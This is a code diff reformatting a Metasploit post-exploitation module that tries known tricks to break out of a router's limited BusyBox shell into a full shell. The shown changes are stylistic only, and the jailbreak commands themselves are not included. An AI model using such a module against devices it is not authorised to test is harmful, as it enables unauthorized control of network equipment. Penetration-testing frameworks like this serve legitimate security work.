@@ -24,16 +24,16 @@ class MetasploitModule < Msf::Post
 
   def initialize
     super(
-      'Name'         => 'BusyBox Jailbreak ',
-      'Description'  => %q{
+      'Name' => 'BusyBox Jailbreak ',
+      'Description' => %q{
         This module will send a set of commands to an open session that is connected to a
         BusyBox limited shell (i.e. a router limited shell). It will try different known
         tricks to jailbreak the limited shell and get a full BusyBox shell.
       },
-      'Author'       => 'Javier Vicente Vallejo',
-      'License'      => MSF_LICENSE,
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell']
+      'Author' => 'Javier Vicente Vallejo',
+      'License' => MSF_LICENSE,
+      'Platform' => ['linux'],
+      'SessionTypes' => ['shell']
     )
   end
 
@@ -49,18 +49,19 @@ class MetasploitModule < Msf::Post
   end
 
   def try_method(command)
-      vprint_status("jailbreak sent: #{command}")
-      session.shell_write("#{command}\n")
-      (1..10).each do
-        resp = session.shell_read
-        next unless resp.to_s.length > 0
-        vprint_status("jailbreak received: #{resp}")
-        if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
-          print_good("Jailbreak accomplished with #{command}")
-          return true
-        end
-      end
+    vprint_status("jailbreak sent: #{command}")
+    session.shell_write("#{command}\n")
+    10.times do
+      resp = session.shell_read
+      next if resp.to_s.empty?
 
-      false
+      vprint_status("jailbreak received: #{resp}")
+      if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
+        print_good("Jailbreak accomplished with #{command}")
+        return true
+      end
+    end
+
+    false
   end
 end
